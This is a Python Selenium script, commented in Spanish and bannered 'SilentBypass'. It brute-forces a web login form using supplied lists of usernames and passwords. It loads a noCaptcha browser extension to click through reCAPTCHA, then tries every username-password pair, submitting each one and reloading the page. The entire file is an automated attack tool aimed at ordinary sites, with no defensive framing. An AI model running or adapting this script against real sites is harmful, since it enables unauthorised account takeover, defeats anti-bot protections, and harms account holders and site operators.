import time
import os
import argparse
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException

# Arte ASCII
ascii_art = r"""

   ▄████████  ▄█   ▄█          ▄████████ ███▄▄▄▄       ███     ▀█████████▄  ▄██   ▄      ▄███████▄    ▄████████    ▄████████    ▄████████ 
  ███    ███ ███  ███         ███    ███ ███▀▀▀██▄ ▀█████████▄   ███    ███ ███   ██▄   ███    ███   ███    ███   ███    ███   ███    ███ 
  ███    █▀  ███▌ ███         ███    █▀  ███   ███    ▀███▀▀██   ███    ███ ███▄▄▄███   ███    ███   ███    ███   ███    █▀    ███    █▀  
  ███        ███▌ ███        ▄███▄▄▄     ███   ███     ███   ▀  ▄███▄▄▄██▀  ▀▀▀▀▀▀███   ███    ███   ███    ███   ███          ███        
▀███████████ ███▌ ███       ▀▀███▀▀▀     ███   ███     ███     ▀▀███▀▀▀██▄  ▄██   ███ ▀█████████▀  ▀███████████ ▀███████████ ▀███████████ 
         ███ ███  ███         ███    █▄  ███   ███     ███       ███    ██▄ ███   ███   ███          ███    ███          ███          ███ 
   ▄█    ███ ███  ███▌    ▄   ███    ███ ███   ███     ███       ███    ███ ███   ███   ███          ███    ███    ▄█    ███    ▄█    ███ 
 ▄████████▀  █▀   █████▄▄██   ██████████  ▀█   █▀     ▄████▀   ▄█████████▀   ▀█████▀   ▄████▀        ███    █▀   ▄████████▀   ▄████████▀  
                  ▀                                                                                                                       
"""
print(ascii_art)


# Configurar el parser de argumentos
parser = argparse.ArgumentParser(description='Script para probar credenciales con CAPTCHA')
parser.add_argument('url', type=str, help='URL objetivo')
parser.add_argument('usuarios_file', type=str, help='Archivo con la lista de usuarios')
parser.add_argument('contraseñas_file', type=str, help='Archivo con la lista de contraseñas')

args = parser.parse_args()

# Solicitar la URL desde la consola
url = args.url
usuarios_file = args.usuarios_file
contraseñas_file = args.contraseñas_file

# Ruta al geckodriver (Firefox driver)
GECKODRIVER_PATH = "/usr/local/bin/geckodriver"

# Ruta al archivo .xpi de noCaptcha
EXTENSION_PATH = os.path.join(os.getcwd(), "noptcha-0.4.12.xpi")

# Configurar Firefox con la extensión noCaptcha
firefox_options = Options()
firefox_options.add_argument("--start-maximized")

# Inicializar el servicio de Firefox
service = FirefoxService(executable_path=GECKODRIVER_PATH)

# Inicializar el driver de Firefox con las opciones configuradas
driver = webdriver.Firefox(service=service, options=firefox_options)

# Instalar la extensión noCaptcha después de iniciar la sesión
driver.install_addon(EXTENSION_PATH)

# Navegar a la página web proporcionada por el usuario
driver.get(url)

# Función para resolver el captcha
def resolve_captcha(captcha_attempt):
    print(f"[+] Intentando captcha {captcha_attempt}...")
    try:
        # Esperar hasta que el iframe del captcha esté disponible
        iframe = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "iframe"))
        )
        driver.switch_to.frame(iframe)

        # Encontrar y hacer clic en el checkbox de reCAPTCHA
        recaptcha_checkbox = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "recaptcha-anchor"))
        )
        recaptcha_checkbox.click()
        print("[+] CAPTCHA detectado y activado.")

        # Esperar para que el usuario complete el CAPTCHA
        print("[+] Espera para visualizar el CAPTCHA...")
        time.sleep(5)  # Aumentar el tiempo según sea necesario
    except NoSuchElementException as e:
        print(f"[-] No se pudo encontrar el elemento del CAPTCHA: {e}")
    except Exception as e:
        print(f"[-] Error resolviendo el CAPTCHA: {e}")
    finally:
        # Volver al contenido principal
        driver.switch_to.default_content()

# Leer usuarios y contraseñas desde los archivos
with open(usuarios_file, 'r') as user_file:
    users = [line.strip() for line in user_file if line.strip()]

with open(contraseñas_file, 'r') as pass_file:
    passwords = [line.strip() for line in pass_file if line.strip()]

# Intentar iniciar sesión con cada usuario
try:
    # Verificar si la URL actual es la de Google reCAPTCHA
    if "google.com/recaptcha" in url:
        # Resolver el captcha una vez
        resolve_captcha(1)
        print("[+] Captcha resuelto en la página de Google. Saliendo...")
    else:
        for username in users:
            print(f"[+] Intentando ingresar con: {username}")
            for password in passwords:
                print(f"[+] Intentando con contraseña: {password}")

                # Resolver CAPTCHA antes de intentar ingresar las credenciales
                resolve_captcha(1)  # Aquí puedes usar un número fijo o un contador si lo prefieres

                # Intentar encontrar los campos de usuario y contraseña
                user_field = None
                pass_field = None
                try:
                    user_field = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.XPATH, '//*[@id="Usuario"]'))
                    )
                    pass_field = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.XPATH, '//*[@id="Password"]'))
                    )
                except NoSuchElementException:
                    # Si no se encontraron campos de entrada, resolver el CAPTCHA
                    resolve_captcha(1)

                # Si los campos de usuario y contraseña fueron encontrados
                if user_field and pass_field:
                    # Ingresar usuario y contraseña
                    user_field.clear()
                    user_field.send_keys(username)
                    pass_field.clear()
                    pass_field.send_keys(password)

                    # Esperar un tiempo antes de hacer clic
                    time.sleep(3)  # Ajustar según sea necesario

                    # Intentar hacer clic en el botón de enviar
                    try:
                        submit_button = WebDriverWait(driver, 10).until(
                            EC.element_to_be_clickable((By.XPATH, "//button[@type='submit']"))
                        )

                        # Desplazar hacia el botón para asegurarse de que sea visible
                        driver.execute_script("arguments[0].scrollIntoView();", submit_button)

                        # Hacer clic en el botón usando JavaScript
                        driver.execute_script("arguments[0].click();", submit_button)

                        print(f"[+] Credenciales {username} : {password} ingresadas correctamente.")

                        # Esperar un momento para comprobar si hay mensajes de alerta
                        time.sleep(2)  # Ajustar según sea necesario

                        # Manejar la alerta de CAPTCHA si aparece
                        try:
                            alert = WebDriverWait(driver, 2).until(EC.alert_is_present())
                            print(f"[+] Mensaje de alerta: {alert.text}")
                            alert.accept()
                            print("[+] Alerta cerrada con éxito.")
                        except NoSuchElementException:
                            pass

                        # Volver a cargar la página para el siguiente intento
                        driver.get(url)

                    except Exception as click_error:
                        print(f"[-] Error al hacer clic en el botón: {click_error}")

except Exception as e:
    print(f"[-] Error: {e}")

finally:
    # Cerrar el navegador
    driver.quit()
